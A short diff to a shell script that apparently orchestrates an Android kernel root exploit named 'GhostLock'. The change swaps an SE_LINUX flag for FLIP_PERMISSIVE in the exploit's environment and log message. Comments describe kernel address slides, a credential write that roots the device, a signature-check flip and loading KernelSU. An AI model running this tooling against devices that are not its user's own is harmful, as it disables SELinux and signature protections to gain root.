@@ -68,7 +68,7 @@ KSU_ALLOW_SHELL="${KSU_ALLOW_SHELL:-0}"   # 1 = load with allow_shell=1 (DEV ONL
 # slide-derived runtime addrs to $RUNDIR/ksu_runtime.env at slide-land and
 # its anchor execs the loader script.
 build_exploit_env(){
-  EXPLOIT_ENV="KS_MAX_TRIES=8 SYSCTL_WALK_ATTEMPTS=4 WALK_TRACE=1 SUSPECT_CPU=99999 DM_SETTLE_MS=3000 SE_LINUX=1 FLIP_SIG=1"
+  EXPLOIT_ENV="KS_MAX_TRIES=8 SYSCTL_WALK_ATTEMPTS=4 WALK_TRACE=1 SUSPECT_CPU=99999 DM_SETTLE_MS=3000 FLIP_PERMISSIVE=1 FLIP_SIG=1"
   EXPLOIT_ENV="$EXPLOIT_ENV KSU_LOADER=1 KSU_RUNDIR=$RUNDIR LINK_COMMIT_CRED=$LINK_COMMIT_CRED LINK_BOOTID_CTL=$LINK_BOOTID_CTL LINK_BOOTID_BUF=$LINK_BOOTID_BUF"
 }
 
@@ -109,7 +109,7 @@ extract_ksud(){
 # Instead, poll the exploit log for the 'anchor rooted' marker (proves the
 # cred write landed), then for the sig-flip marker.
 establish(){
-  log "launching GhostLock (SE_LINUX=1 FLIP_SIG=1 KSU_LOADER=1) detached"
+  log "launching GhostLock (FLIP_PERMISSIVE=1 FLIP_SIG=1 KSU_LOADER=1) detached"
   # logcat live-stream: post-land deaths leave ZERO kernel trace (no oops,
   # empty pstore) — logcat is the only channel that can show a userspace-
   # ordered reset, and streaming lands it on the host before the device dies.
